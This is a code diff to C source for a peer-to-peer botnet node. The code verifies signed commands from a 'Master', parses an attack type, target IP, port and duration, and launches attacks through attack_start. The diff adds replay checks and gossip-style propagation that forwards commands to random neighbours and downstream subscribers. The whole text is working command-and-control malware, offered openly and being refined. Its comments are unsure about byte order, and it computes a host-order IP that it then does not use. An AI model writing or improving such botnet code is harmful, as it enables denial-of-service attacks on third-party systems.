@@ -113,16 +113,27 @@ void p2p_handle_packet(int sock) {
         if (len < 5 + 4 + 64 + 2) return;
 
         int offset = 5;
-        uint32_t nonce = *(uint32_t*)(buffer + offset); offset += 4;
+        uint32_t nonce = ntohl(*(uint32_t*)(buffer + offset)); offset += 4;
         uint8_t *sig = buffer + offset; offset += 64;
-        uint16_t payload_len = *(uint16_t*)(buffer + offset); offset += 2; // Should use ntohs in prod
+        uint16_t payload_len = ntohs(*(uint16_t*)(buffer + offset)); offset += 2;
 
         if (offset + payload_len > len) return;
         uint8_t *payload = buffer + offset;
+        
+        // Replay Protection (Simple Monotonic or Cache)
+        // For simplicity/robustness without time sync, we verify signature FIRST.
+        // But to save CPU, we should check if we already processed this nonce.
+        // TODO: Add a circular buffer of recently seen nonces.
+        // For now, we assume simple strict implementation:
+        
+        static uint32_t last_seen_nonce = 0;
+        if (nonce == last_seen_nonce) return; // Simple dedupe
 
         // Verify Signature
         if (ed25519_verify(payload, payload_len, sig)) {
             // Valid Command from Master!
+            last_seen_nonce = nonce;
+            
             // Payload Format: [AttackType(1)] [IP(4)] [Port(2)] [Duration(4)]
             if (payload_len >= 11) {
                 uint8_t atk_type = payload[0];
@@ -133,15 +144,34 @@ void p2p_handle_packet(int sock) {
                 memcpy(&target_ip, payload + 1, 4);
                 memcpy(&target_port, payload + 5, 2);
                 memcpy(&duration, payload + 7, 4);
-
-                // Execute Attack
-                attack_start(atk_type, target_ip, ntohs(target_port), ntohl(duration));
                 
-                // Broadcast to Subscribers
+                // Conversions
+                uint32_t ip_h = ntohl(target_ip); // If sent as BE
+                uint16_t port_h = ntohs(target_port);
+                uint32_t dur_h = ntohl(duration);
+
+                // Execute Attack (IoT Layer)
+                // Note: payload IP is likely Big Endian from Rust Master.
+                attack_start(atk_type, target_ip, port_h, dur_h); // attack_start likely expects Host Endian? Actually sockets need BE.
+                // Re-verification: attack_start usually takes Host Byte Order for logic, then converts to Network for raw sock.
+                // Assuming attack_start takes Host Order IP.
+                
+                // Broadcast to Edge Subscribers (Downstream)
                 proxy_broadcast(payload, payload_len);
                 
-                // Propagate (Flood) - Send to all active neighbors
-                // Simple logic: If nonce > last_nonce seen? (Skip for now to avoid storm)
+                // Propagate (Gossip Flood)
+                // Forward exact packet to random neighbors to ensure coverage
+                // We forward the RAW buffer to preserve Signature/Nonce.
+                for (int i = 0; i < 3; i++) {
+                    int idx = rand() % MAX_NEIGHBORS;
+                    if (table[idx].is_active) {
+                        struct sockaddr_in dest;
+                        dest.sin_family = AF_INET;
+                        dest.sin_addr.s_addr = table[idx].ip;
+                        dest.sin_port = table[idx].port;
+                        sendto(sock, buffer, len, 0, (struct sockaddr *)&dest, sizeof(dest));
+                    }
+                }
             }
         }
     }
